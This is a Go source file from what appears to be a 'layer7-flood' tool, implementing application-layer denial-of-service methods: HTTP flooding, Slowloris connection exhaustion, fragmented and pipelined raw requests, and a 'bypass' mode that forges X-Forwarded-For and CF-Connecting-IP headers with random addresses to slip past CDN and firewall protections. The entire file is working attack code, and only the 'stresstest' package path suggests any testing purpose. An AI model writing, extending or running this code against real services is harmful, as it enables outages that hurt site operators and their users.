// pkg/utils/multiclient.go
package utils

import (
    "fmt"
    "net"
    "net/http"
    "strings"
    "time"

    "github.com/stresstest/layer7-flood/pkg/config"
)

type MultiProtocolClient struct {
    cfg    *config.Config
    http   *http.Client
    rawConns []net.Conn
}

func NewMultiProtocolClient(cfg *config.Config) *MultiProtocolClient {
    return &MultiProtocolClient{
        cfg:  cfg,
        http: &http.Client{Timeout: 10 * time.Second},
        rawConns: make([]net.Conn, 0),
    }
}

func (m *MultiProtocolClient) DoFlood() error {
    req := BuildRequest(m.cfg, 0)
    CustomizeRequest(req, m.cfg)
    resp, err := m.http.Do(req)
    if err != nil {
        return err
    }
    resp.Body.Close()
    return nil
}

func (m *MultiProtocolClient) DoSlowloris(counter int) error {
    conn, err := net.DialTimeout("tcp", m.cfg.Target.Host, 5*time.Second)
    if err != nil {
        return err
    }
    
    request := fmt.Sprintf("GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
        counter, m.cfg.Target.Hostname, RandomUserAgent())
    
    _, err = conn.Write([]byte(request))
    if err != nil {
        conn.Close()
        return err
    }
    
    m.rawConns = append(m.rawConns, conn)
    
    // Keep connection open with partial headers
    if counter%10 == 0 {
        partial := "X-KeepAlive: " + RandomString(12) + "\r\n"
        conn.Write([]byte(partial))
    }
    
    return nil
}

func (m *MultiProtocolClient) DoBypass() error {
    req, _ := http.NewRequest("GET", m.cfg.Target.URL, nil)
    req.Header.Set("X-Forwarded-For", RandomIP())
    req.Header.Set("CF-Connecting-IP", RandomIP())
    req.Header.Set("X-Originating-IP", RandomIP())
    
    resp, err := m.http.Do(req)
    if err != nil {
        return err
    }
    resp.Body.Close()
    return nil
}

func (m *MultiProtocolClient) DoFragment() error {
    host := m.cfg.Target.Host
    request := "GET /" + RandomString(10) + " HTTP/1.1\r\n"
    request += "Host: " + host + "\r\n"
    request += "User-Agent: " + RandomUserAgent() + "\r\n"
    request += strings.Repeat("X-Fragment: " + RandomString(50) + "\r\n", 5)
    
    conn, err := net.DialTimeout("tcp", host, 5*time.Second)
    if err != nil {
        return err
    }
    defer conn.Close()
    
    // Send fragmented
    for i := 0; i < len(request); i += 10 {
        end := i + 10
        if end > len(request) {
            end = len(request)
        }
        _, err := conn.Write([]byte(request[i:end]))
        if err != nil {
            return err
        }
        time.Sleep(1 * time.Millisecond)
    }
    
    return nil
}

func (m *MultiProtocolClient) DoPipeline() error {
    host := m.cfg.Target.Host
    conn, err := net.DialTimeout("tcp", host, 5*time.Second)
    if err != nil {
        return err
    }
    defer conn.Close()
    
    // Pipeline multiple requests
    var pipeline strings.Builder
    for i := 0; i < 5; i++ {
        pipeline.WriteString(fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\n\r\n", i, host))
    }
    
    _, err = conn.Write([]byte(pipeline.String()))
    if err != nil {
        return err
    }
    
    // Read responses
    buf := make([]byte, 4096)
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    conn.Read(buf)
    
    return nil
}

func (m *MultiProtocolClient) Close() {
    for _, conn := range m.rawConns {
        conn.Close()
    }
}
